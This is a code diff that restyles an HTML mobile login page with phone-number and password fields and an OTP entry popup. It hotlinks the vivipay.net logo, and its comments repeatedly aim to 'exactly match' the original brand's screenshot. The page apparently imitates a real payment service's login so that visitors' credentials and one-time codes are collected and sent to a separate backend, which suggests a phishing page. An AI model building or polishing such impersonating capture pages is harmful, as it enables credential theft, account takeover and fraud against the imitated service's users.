@@ -28,32 +28,30 @@
 
         .login-wrapper {
             width: 100%;
-            max-width: 440px; 
+            max-width: 412px; 
             min-height: 100vh;
             background-color: #ffffff;
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 40px 35px;
+            padding: 45px 30px;
             position: relative;
         }
 
-        /* 👑 MAXIMUM BIG LOGO STYLING FOR ORIGINAL LOOK 👑 */
+        /* 👑 EXACT MATCH ORIGINAL LOGO DESIGN 👑 */
         .brand-container {
-            margin-top: 35px;
-            margin-bottom: 50px; /* Gap adjusted for zoomed logo */
+            margin-top: 50px;
+            margin-bottom: 70px; 
             display: flex;
             justify-content: center;
             align-items: center;
             width: 100%;
-            overflow: visible; /* Prevent clipping when scaled */
         }
 
         .brand-logo {
-            width: 280px;  /* Size drastically increased from 220px */
-            height: 280px;
+            width: 200px;  
+            height: 200px;
             object-fit: contain;
-            transform: scale(1.35); /* Zoomed 35% extra to force remove empty margins */
         }
 
         .auth-form {
@@ -62,30 +60,30 @@
             flex-direction: column;
         }
 
-        /* BADE AUR CLEAR INPUT BOXES */
+        /* ORIGINAL CAPSULE INPUTS */
         .input-field-group {
             background-color: #f6f9fe; 
             border: none;
-            border-radius: 25px; 
+            border-radius: 30px; /* Fully rounded capsule design */
             display: flex;
             align-items: center;
-            padding: 20px 26px; 
-            margin-bottom: 22px;
+            padding: 18px 24px; 
+            margin-bottom: 20px;
             width: 100%;
         }
 
-        /* Icons clear aur blue color mein */
         .field-icon {
             display: flex;
             align-items: center;
-            margin-right: 18px;
+            margin-right: 14px;
         }
 
+        /* Thin stroke soft blue icons exactly like original */
         .field-icon svg {
-            width: 26px; 
-            height: 26px;
+            width: 24px; 
+            height: 24px;
             stroke: #1a85ff; 
-            stroke-width: 1.8;
+            stroke-width: 1.5;
             fill: none;
         }
 
@@ -100,20 +98,20 @@
         }
 
         .input-field-group input::placeholder {
-            color: #b0c0d6; 
+            color: #bcccdf; 
             font-weight: 400;
         }
 
-        /* UTILITIES AREA (SAVE PASSWORD & FORGOT LINK) */
+        /* UTILITIES AREA */
         .form-utilities {
             display: flex;
             justify-content: space-between;
             align-items: center;
             font-size: 16px; 
-            margin-top: 8px;
-            margin-bottom: 55px;
+            margin-top: 5px;
+            margin-bottom: 45px;
             width: 100%;
-            padding: 0 6px;
+            padding: 0 4px;
         }
 
         .remember-me {
@@ -121,46 +119,46 @@
             align-items: center;
             color: #1a85ff;
             cursor: pointer;
-            font-weight: 500;
+            font-weight: 400;
         }
 
-        /* CIRCULAR CHECKBOX LIKE ORIGINAL SCREENSHOT */
+        /* Round hollow circle check */
         .remember-me input {
             appearance: none;
             -webkit-appearance: none;
             width: 18px;
             height: 18px;
-            border: 1.5px solid #1a85ff;
+            border: 1.2px solid #bcccdf;
             border-radius: 50%; 
             outline: none;
             margin-right: 10px;
             cursor: pointer;
             display: inline-block;
-            position: relative;
+            background-color: #ffffff;
         }
 
         .remember-me input:checked {
+            border-color: #1a85ff;
             background-color: #1a85ff;
         }
 
         .forgot-pass-link {
             text-decoration: none;
             color: #1a85ff;
-            font-weight: 500;
+            font-weight: 400;
         }
 
-        /* BADA AUR BOLD ORIGINAL LOOK BUTTON */
+        /* SQUARE-ISH ROUNDED BUTTON EXTRANEOUS LOOK */
         .submit-btn {
             background-color: #1a85ff; 
             color: #ffffff;
             border: none;
             width: 100%;
-            padding: 18px; 
-            border-radius: 12px; 
+            padding: 16px; 
+            border-radius: 10px; /* Slight roundness like screenshot */
             font-size: 20px; 
             font-weight: 500;
             cursor: pointer;
-            box-shadow: none; 
             transition: background 0.2s ease;
         }
 
@@ -168,7 +166,7 @@
             background-color: #0071eb;
         }
 
-        /* PRIVACY POLICY CENTER ALIGNED */
+        /* PRIVACY POLICY */
         .policy-agreement {
             margin-top: 25px;
             display: flex;
@@ -207,7 +205,7 @@
             color: white;
             font-size: 12px;
             font-weight: bold;
-            top: 0px;
+            top: -1px;
         }
 
         .policy-link {
@@ -217,7 +215,7 @@
             margin-left: 4px;
         }
 
-        /* OTP POPUP MODAL STYLES */
+        /* OTP MODAL */
         .otp-modal-overlay {
             position: fixed;
             top: 0;
@@ -243,7 +241,7 @@
         .otp-modal-container {
             background-color: #ffffff;
             width: 100%;
-            max-width: 380px;
+            max-width: 360px;
             border-radius: 18px;
             padding: 30px 24px;
             position: relative;
@@ -285,8 +283,8 @@
         }
 
         .otp-box {
-            width: 55px;
-            height: 55px;
+            width: 50px;
+            height: 50px;
             border: none;
             border-bottom: 2.5px solid #cbd5e1;
             text-align: center;
@@ -311,25 +309,28 @@
 <body>
 
     <div class="login-wrapper">
+        <!-- Exact Ratio Logo Container -->
         <div class="brand-container">
             <img src="https://vivipay.net/static/images/Login_Logo.png" alt="Brand Logo" class="brand-logo">
         </div>
 
         <form class="auth-form" id="loginForm">
+            <!-- Mobile Field -->
             <div class="input-field-group">
                 <span class="field-icon">
                     <svg viewBox="0 0 24 24">
-                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                        <rect x="6" y="2" width="12" height="20" rx="2" ry="2"></rect>
                         <line x1="12" y1="18" x2="12.01" y2="18"></line>
                     </svg>
                 </span>
                 <input type="tel" id="phoneNumber" placeholder="Enter phone number" required>
             </div>
 
+            <!-- Password Field -->
             <div class="input-field-group">
                 <span class="field-icon">
                     <svg viewBox="0 0 24 24">
-                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <rect x="4" y="11" width="16" height="11" rx="2" ry="2"></rect>
                         <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                     </svg>
                 </span>
@@ -355,10 +356,10 @@
         </form>
     </div>
 
+    <!-- OTP Modal Overlay -->
     <div class="otp-modal-overlay" id="otpModal">
         <div class="otp-modal-container">
             <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
-            
             <div class="otp-title">Please enter OTP</div>
             <div class="otp-subtitle" id="otpSentText">OTP sent to 637****9782</div>
             
@@ -368,7 +369,6 @@
                 <input type="tel" class="otp-box" maxlength="1" oninput="moveNext(this, 'otp4')" id="otp3">
                 <input type="tel" class="otp-box" maxlength="1" oninput="checkAndSubmitOtp(this)" id="otp4">
             </div>
-
             <div class="otp-timer">Resend in <span id="secondsCount">118</span> seconds</div>
         </div>
     </div>
@@ -420,7 +420,7 @@
                     alert("Server Error! Try again.");
                 }
             } catch (error) {
-                alert("Cannot connect to Backend Server! Please check your network connection.");
+                alert("Cannot connect to Backend Server!");
             }
         });
 
